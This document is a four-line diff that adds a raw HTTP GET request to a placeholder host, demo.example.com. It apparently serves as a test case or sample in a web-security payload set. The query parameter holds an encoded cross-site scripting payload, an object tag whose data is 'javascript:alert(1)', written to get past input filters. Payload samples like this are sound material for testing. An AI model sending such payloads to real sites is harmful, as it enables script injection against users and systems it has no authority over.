@@ -1,0 +1,4 @@
+GET /a?path=\u003Cobject%20data%3D\u0022javascript:alert(1)\u0022\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
